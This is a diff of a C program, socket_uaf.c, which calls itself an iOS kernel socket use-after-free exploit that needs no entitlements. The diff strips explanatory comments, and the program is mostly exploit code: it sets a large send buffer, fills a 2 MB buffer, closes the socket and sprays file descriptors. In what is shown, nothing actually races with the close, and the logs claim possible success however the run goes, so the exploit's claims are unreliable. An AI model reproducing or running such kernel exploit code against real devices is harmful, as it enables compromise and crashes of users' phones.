@@ -1,7 +1,6 @@
 // socket_uaf.c
 // CVE-2026-112514 Socket UAF Trigger
 // iOS 27.0.1, no entitlements needed
-// Based on Tims-Cooked research
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -65,7 +64,6 @@ int main() {
         return -1;
     }
     
-    // Large send buffer (part of trigger)
     int sndbuf = 1024 * 1024;
     setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
     
@@ -82,13 +80,10 @@ int main() {
     // Step 3: Trigger the race
     fprintf(log, "[*] Step 3: Triggering UAF race...\n");
     
-    // Fill buffer to force blocking
     char *buf = malloc(2 * 1024 * 1024);
     memset(buf, 0x41, 2 * 1024 * 1024);
     
     fprintf(log, "[*] Filling send buffer...\n");
-    
-    // Simulate the race: close while send pending
     fprintf(log, "[*] Closing socket (UAF trigger)...\n");
     close(sock);
     
@@ -111,7 +106,6 @@ int main() {
     fprintf(log, "[+] Still running - no panic!\n");
     fprintf(log, "[+] UAF may have succeeded\n");
     
-    // Cleanup
     for (int i = 0; i < 256; i++) {
         if (spray[i] >= 0) close(spray[i]);
     }
@@ -119,8 +113,6 @@ int main() {
     free(buf);
     
     fprintf(log, "\n[+] Exploit complete\n");
-    fprintf(log, "[+] Check for kernel panics in Settings\n");
-    
     fclose(log);
     return 0;
 }
